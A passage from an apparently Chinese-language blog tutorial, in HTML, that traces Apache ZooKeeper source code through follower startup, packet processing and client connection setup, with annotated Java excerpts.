class="keyword">void</span> <span class="title">setupRequestProcessors</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    RequestProcessor finalProcessor = <span class="keyword">new</span> FinalRequestProcessor(<span class="keyword">this</span>);</span><br><span class="line">    RequestProcessor syncProcessor = <span class="keyword">new</span> SyncRequestProcessor(<span class="keyword">this</span>,</span><br><span class="line">            finalProcessor);</span><br><span class="line">    ((SyncRequestProcessor)syncProcessor).start();</span><br><span class="line">    firstProcessor = <span class="keyword">new</span> PrepRequestProcessor(<span class="keyword">this</span>, syncProcessor);</span><br><span class="line">    ((PrepRequestProcessor)firstProcessor).start();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//点击 PrepRequestProcessor，并查找它的 run 方法</span></span><br></pre></td></tr></table></figure><h3 id="6-2-Follower-启动">6.2 Follower 启动</h3><p><img src="http://qnypic.shawncoding.top/blog/202402291817161.png" alt></p><p>FollowerZooKeeperServer全局查找 Follower，然后 ctrl + f 查找 followLeader()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">followLeader</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">......</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">this</span>.isRunning()) &#123;</span><br><span class="line">            readPacket(qp);</span><br><span class="line">            processPacket(qp);</span><br><span class="line">        &#125;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">readPacket</span><span class="params">(QuorumPacket pp)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">synchronized</span> (leaderIs) &#123;</span><br><span class="line">        leaderIs.readRecord(pp, <span class="string">"packet"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (LOG.isTraceEnabled()) &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">long</span> traceMask =</span><br><span class="line">            (pp.getType() == Leader.PING) ? ZooTrace.SERVER_PING_TRACE_MASK</span><br><span class="line">                : ZooTrace.SERVER_PACKET_TRACE_MASK;</span><br><span class="line"></span><br><span class="line">        ZooTrace.logQuorumPacket(LOG, traceMask, <span class="string">'i'</span>, pp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">processPacket</span><span class="params">(QuorumPacket qp)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (qp.getType()) &#123;</span><br><span class="line">    <span class="keyword">case</span> Leader.PING:            </span><br><span class="line">        ping(qp);            </span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> Leader.PROPOSAL:           </span><br><span class="line">        TxnHeader hdr = <span class="keyword">new</span> TxnHeader();</span><br><span class="line">        Record txn = SerializeUtils.deserializeTxn(qp.getData(), hdr);</span><br><span class="line">        <span class="keyword">if</span> (hdr.getZxid() != lastQueued + <span class="number">1</span>) &#123;</span><br><span class="line">            LOG.warn(<span class="string">"Got zxid 0x"</span></span><br><span class="line">                    + Long.toHexString(hdr.getZxid())</span><br><span class="line">                    + <span class="string">" expected 0x"</span></span><br><span class="line">                    + Long.toHexString(lastQueued + <span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        lastQueued = hdr.getZxid();</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (hdr.getType() == OpCode.reconfig)&#123;</span><br><span class="line">           SetDataTxn setDataTxn = (SetDataTxn) txn;       </span><br><span class="line">           QuorumVerifier qv = self.configFromString(<span class="keyword">new</span> String(setDataTxn.getData()));</span><br><span class="line">           self.setLastSeenQuorumVerifier(qv, <span class="keyword">true</span>);                               </span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        fzk.logRequest(hdr, txn);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> Leader.COMMIT:</span><br><span class="line">        fzk.commit(qp.getZxid());</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">case</span> Leader.COMMITANDACTIVATE:</span><br><span class="line">       <span class="comment">// get the new configuration from the request</span></span><br><span class="line">       Request request = fzk.pendingTxns.element();</span><br><span class="line">       SetDataTxn setDataTxn = (SetDataTxn) request.getTxn();                                                                                                      </span><br><span class="line">       QuorumVerifier qv = self.configFromString(<span class="keyword">new</span> String(setDataTxn.getData()));                                </span><br><span class="line">       <span class="comment">// get new designated leader from (current) leader's message</span></span><br><span class="line">       ByteBuffer buffer = ByteBuffer.wrap(qp.getData());    </span><br><span class="line">       <span class="keyword">long</span> suggestedLeaderId = buffer.getLong();</span><br><span class="line">        <span class="keyword">boolean</span> majorChange = </span><br><span class="line">               self.processReconfig(qv, suggestedLeaderId, qp.getZxid(), <span class="keyword">true</span>);</span><br><span class="line">       <span class="comment">// commit (writes the new config to ZK tree (/zookeeper/config)                     </span></span><br><span class="line">       fzk.commit(qp.getZxid());</span><br><span class="line">        <span class="keyword">if</span> (majorChange) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">"changes proposed in reconfig"</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> Leader.UPTODATE:</span><br><span class="line">        LOG.error(<span class="string">"Received an UPTODATE message after Follower started"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> Leader.REVALIDATE:</span><br><span class="line">        revalidate(qp);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> Leader.SYNC:</span><br><span class="line">        fzk.sync();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        LOG.warn(<span class="string">"Unknown packet type: &#123;&#125;"</span>, LearnerHandler.packetToString(qp));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="7、客户端启动">7、客户端启动</h2><p><img src="http://qnypic.shawncoding.top/blog/202402291817162.png" alt></p><p>在 <a href="http://ZkCli.sh" target="_blank" rel="noopener">ZkCli.sh</a> 启动 Zookeeper 时，会调用 ZooKeeperMain.java，查找 ZooKeeperMain，找到程序的入口 main()方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> CliException, IOException, InterruptedException</span>&#123;</span><br><span class="line">    ZooKeeperMain main = <span class="keyword">new</span> ZooKeeperMain(args);</span><br><span class="line">    main.run();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="7-1-创建-ZookeeperMain">7.1 创建 ZookeeperMain</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ZooKeeperMain</span><span class="params">(String args[])</span> <span class="keyword">throws</span> IOException, InterruptedException </span>&#123;</span><br><span class="line">    cl.parseOptions(args);</span><br><span class="line">    System.out.println(<span class="string">"Connecting to "</span> + cl.getOption(<span class="string">"server"</span>));</span><br><span class="line">    connectToZK(cl.getOption(<span class="string">"server"</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">connectToZK</span><span class="params">(String newHost)</span> <span class="keyword">throws</span> InterruptedException, IOException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (zk != <span class="keyword">null</span> &amp;&amp; zk.getState().isAlive()) &#123;</span><br><span class="line">        zk.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    host = newHost;</span><br><span class="line">    <span class="keyword">boolean</span> readOnly = cl.getOption(<span class="string">"readonly"</span>) != <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (cl.getOption(<span class="string">"secure"</span>) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        System.setProperty(ZKClientConfig.SECURE_CLIENT, <span class="string">"true"</span>);</span><br><span class="line">        System.out.println(<span class="string">"Secure connection is enabled"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    zk = <span class="keyword">new</span> ZooKeeperAdmin(host, Integer.parseInt(cl.getOption(<span class="string">"timeout"</span>)), <span class="keyword">new</span> MyWatcher(), readOnly);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="7-2-初始化监听器">7.2 初始化监听器</h3><p>ZooKeeperAdmin一直点进去</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ZooKeeper</span><span class="params">(String connectString, <span class="keyword">int</span> sessionTimeout, Watcher watcher,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">boolean</span> canBeReadOnly, HostProvider aHostProvider,</span></span></span><br><span class="line"><span class="function"><span class="params">        ZKClientConfig clientConfig)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    LOG.info(<span class="string">"Initiating client connection, connectString="</span> + connectString</span><br><span class="line">            + <span class="string">" sessionTimeout="</span> + sessionTimeout + <span class="string">" watcher="</span> + watcher);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (clientConfig == <span class="keyword">null</span>) &#123;</span><br><span class="line">        clientConfig = <span class="keyword">new</span> ZKClientConfig();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">this</span>.clientConfig = clientConfig;</span><br><span class="line">    watchManager = defaultWatchManager();</span><br><span class="line">    <span class="comment">// 赋值 watcher 给默认的 defaultWatcher</span></span><br><span class="line">    watchManager.defaultWatcher = watcher;</span><br><span class="line">    ConnectStringParser connectStringParser = <span class="keyword">new</span> ConnectStringParser(</span><br><span class="line">            connectString);</span><br><span class="line">    hostProvider = aHostProvider;</span><br><span class="line">    <span class="comment">// 客户端与服务器端通信的终端</span></span><br><span class="line">    cnxn = createConnection(connectStringParser.getChrootPath(),</span><br><span class="line">            hostProvider, sessionTimeout, <span class="keyword">this</span>, watchManager,</span><br><span class="line">            getClientCnxnSocket(), canBeReadOnly);</span><br><span class="line">    cnxn.start();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="7-3-解析连接地址">7.3 解析连接地址</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ConnectStringParser</span><span class="params">(String connectString)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// parse out chroot, if any</span></span><br><span class="line">    <span class="keyword">int</span> off = connectString.indexOf(<span class="string">'/'</span>);</span><br><span class="line">    <span class="keyword">if</span> (off &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        String chrootPath = connectString.substring(off);</span><br><span class="line">        <span class="comment">// ignore "/" chroot spec, same as null</span></span><br><span class="line">        <span class="keyword">if</span> (chrootPath.length() == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">this</span>.chrootPath = <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            PathUtils.validatePath(chrootPath);</span><br><span class="line">            <span class="keyword">this</span>.chrootPath = chrootPath;</span><br><span class="line">        &#125;</span><br><span class="line">        connectString = connectString.substring(<span class="number">0</span>, off);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.chrootPath = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// "hadoop102:2181,hadoop103:2181,hadoop104:2181"用逗号切割</span></span><br><span class="line">    List&lt;String&gt; hostsList = split(connectString,<span class="string">","</span>);</span><br><span class="line">    <span class="keyword">for</span> (String host : hostsList) &#123;</span><br><span class="line">        <span class="keyword">int</span> port = DEFAULT_PORT;</span><br><span class="line">        <span class="keyword">int</span> pidx = host.lastIndexOf(<span class="string">':'</span>);</span><br><span class="line">        <span class="keyword">if</span> (pidx &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// otherwise : is at the end of the string, ignore</span></span><br><span class="line">            <span class="keyword">if</span> (pidx &lt; host.length() - <span class="number">1</span>) &#123;</span><br><span class="line">                port = Integer.parseInt(host.substring(pidx + <span class="number">1</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            host = host.substring(<span class="number">0</span>, pidx);</span><br><span class="line">        &#125;</span><br><span class="line">        serverAddresses.add(InetSocketAddress.createUnresolved(host, port));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InetSocketAddress</span> <span class="keyword">extends</span> <span class="title">SocketAddress</span></span>&#123;</span><br><span class="line">    <span class="comment">// Private implementation class pointed to by all public methods.</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">InetSocketAddressHolder</span> </span>&#123;</span><br><span class="line">        <span class="comment">// The hostname of the Socket Address 主机名称</span></span><br><span class="line">        <span class="keyword">private</span> String hostname;</span><br><span class="line">        <span class="comment">// The IP address of the Socket Address 通信地址</span></span><br><span class="line">        <span class="keyword">private</span> InetAddress addr;</span><br><span class="line">        <span class="comment">// The port number of the Socket Address 端口号</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">int</span> port;</span><br><span class="line">        ... ...</span><br><span class="line">    &#125;</span><br><span class="line">    ... ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="7-4-创建通信">7.4 创建通信</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ZooKeeper</span><span class="params">(String connectString, <span class="keyword">int</span> sessionTimeout, Watcher watcher,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">boolean</span> canBeReadOnly, HostProvider aHostProvider,</span></span></span><br><span class="line"><span class="function"><span class="params">        ZKClientConfig clientConfig)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="comment">// 客户端与服务器端通信的终端</span></span><br><span class="line">    cnxn = createConnection(connectStringParser.getChrootPath(),</span><br><span class="line">            hostProvider, sessionTimeout, <span class="keyword">this</span>, watchManager,</span><br><span class="line">            getClientCnxnSocket(), canBeReadOnly);</span><br><span class="line">    cnxn.start();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> ClientCnxn <span class="title">createConnection</span><span class="params">(String chrootPath,</span></span></span><br><span class="line"><span class="function"><span class="params">        HostProvider hostProvider, <span class="keyword">int</span> sessionTimeout, ZooKeeper zooKeeper,</span></span></span><br><span class="line"><span class="function"><span class="params">        ClientWatchManager watcher, ClientCnxnSocket clientCnxnSocket,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">boolean</span> canBeReadOnly)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> ClientCnxn(chrootPath, hostProvider, sessionTimeout, <span class="keyword">this</span>,</span><br><span class="line">            watchManager, clientCnxnSocket, canBeReadOnly);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 一直点下去，直到这里</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ClientCnxn</span><span class="params">(String chrootPath, HostProvider hostProvider, <span class="keyword">int</span> sessionTimeout, ZooKeeper zooKeeper,</span></span></span><br><span class="line"><span class="function"><span class="params">        ClientWatchManager watcher, ClientCnxnSocket clientCnxnSocket,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">long</span> sessionId, <span class="keyword">byte</span>[] sessionPasswd, <span class="keyword">boolean</span> canBeReadOnly)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.zooKeeper = zooKeeper;</span><br><span class="line">    <span class="keyword">this</span>.watcher = watcher;</span><br><span class="line">    <span class="keyword">this</span>.sessionId = sessionId;</span><br><span class="line">    <span class="keyword">this</span>.sessionPasswd = sessionPasswd;</span><br><span class="line">    <span class="keyword">this</span>.sessionTimeout = sessionTimeout;</span><br><span class="line">    <span class="keyword">this</span>.hostProvider = hostProvider;</span><br><span class="line">    <span class="keyword">this</span>.chrootPath = chrootPath;</span><br><span class="line"></span><br><span class="line">    connectTimeout = sessionTimeout / hostProvider.size();</span><br><span class="line">    readTimeout = sessionTimeout * <span class="number">2</span> / <span class="number">3</span>;</span><br><span class="line">    readOnly = canBeReadOnly;</span><br><span class="line"></span><br><span class="line">    sendThread = <span class="keyword">new</span> SendThread(clientCnxnSocket);</span><br><span class="line">    eventThread = <span class="keyword">new</span> EventThread();</span><br><span class="line">    <span class="keyword">this</span>.clientConfig=zooKeeper.getClientConfig();</span><br><span class="line">    initRequestTimeout();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>点击SendThread，查找run方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ZooKeeperThread 是一个线程，执行它的 run()方法</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    clientCnxnSocket.introduce(<span class="keyword">this</span>, sessionId, outgoingQueue);</span><br><span class="line">    clientCnxnSocket.updateNow();</span><br><span class="line">    clientCnxnSocket.updateLastSendAndHeard();</span><br><span class="line">    <span class="keyword">int</span> to;</span><br><span class="line">    <span class="keyword">long</span> lastPingRwServer = Time.currentElapsedTime();</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">int</span> MAX_SEND_PING_INTERVAL = <span class="number">10000</span>; <span class="comment">//10 seconds</span></span><br><span class="line">    InetSocketAddress serverAddress = <span class="keyword">null</span>;</span><br><span class="line">    <span class="comment">// 在循环里面，循环发送，循环接收</span></span><br><span class="line">    <span class="keyword">while</span> (state.isAlive()) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!clientCnxnSocket.isConnected()) &#123;</span><br><span class="line">                <span class="comment">// don't re-establish connection if we are closing</span></span><br><span class="line">                <span class="keyword">if</span> (closing) &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (rwServerAddress != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    serverAddress = rwServerAddress;</span><br><span class="line">                    rwServerAddress = <span class="keyword">null</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    serverAddress = hostProvider.next(<span class="number">1000</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 启动连接服务端</span></span><br><span class="line">                startConnect(serverAddress);</span><br><span class="line">             ......</span><br><span class="line"></span><br><span class="line">            <span class="comment">// If we are in read-only mode, seek for read/write server</span></span><br><span class="line">            <span class="keyword">if</span> (state == States.CONNECTEDREADONLY) &#123;</span><br><span class="line">                <span class="keyword">long</span> now = Time.currentElapsedTime();</span><br><span class="line">                <span class="keyword">int</span> idlePingRwServer = (<span class="keyword">int</span>) (now - lastPingRwServer);</span><br><span class="line">                <span class="keyword">if</span> (idlePingRwServer &gt;= pingRwTimeout) &#123;</span><br><span class="line">                    lastPingRwServer = now;</span><br><span class="line">                    idlePingRwServer = <span class="number">0</span>;</span><br><span class="line">                    pingRwTimeout =</span><br><span class="line">                        Math.min(<span class="number">2</span>*pingRwTimeout, maxPingRwTimeout);</span><br><span class="line">                    pingRwServer();</span><br><span class="line">                &#125;</span><br><span class="line">                to = Math.min(to, pingRwTimeout - idlePingRwServer);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 接收服务端响应，并处理</span></span><br><span class="line">            clientCnxnSocket.doTransport(to, pendingQueue, ClientCnxn.<span class="keyword">this</span>);</span><br><span class="line">        ......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">startConnect</span><span class="params">(InetSocketAddress addr)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    logStartConnect(addr);</span><br><span class="line">    <span class="comment">// 建立连接</span></span><br><span class="line">    clientCnxnSocket.connect(addr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ctrl + alt +B 查找 connect 实现类，ClientCnxnSocketNIO.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">connect</span><span class="params">(InetSocketAddress addr)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    SocketChannel sock = createSock();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">       registerAndConnect(sock, addr);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        LOG.error(<span class="string">"Unable to open socket to "</span> + addr);</span><br><span class="line">        sock.close();</span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line">    &#125;</span><br><span class="line">    initialized = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Reset incomingBuffer</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    lenBuffer.clear();</span><br><span class="line">    incomingBuffer = lenBuffer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">registerAndConnect</span><span class="params">(SocketChannel sock, InetSocketAddress addr)</span> </span></span><br><span class="line"><span class="function"><span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    sockKey = sock.register(selector, SelectionKey.OP_CONNECT);</span><br><span class="line">    <span class="keyword">boolean</span> immediateConnect = sock.connect(addr);</span><br><span class="line">    <span class="keyword">if</span> (immediateConnect) &#123;</span><br><span class="line">        sendThread.primeConnection();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">primeConnection</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    LOG.info(<span class="string">"Socket connection established, initiating session, client: &#123;&#125;, server: &#123;&#125;"</span>,</span><br><span class="line">    clientCnxnSocket.getLocalSocketAddress(),</span><br><span class="line">    clientCnxnSocket.getRemoteSocketAddress());</span><br><span class="line">    <span class="comment">// 标记不是第一次连接</span></span><br><span class="line">    isFirstConnect = <span class="keyword">false</span>;</span><br><span class="line">    ... ...</span><br><span 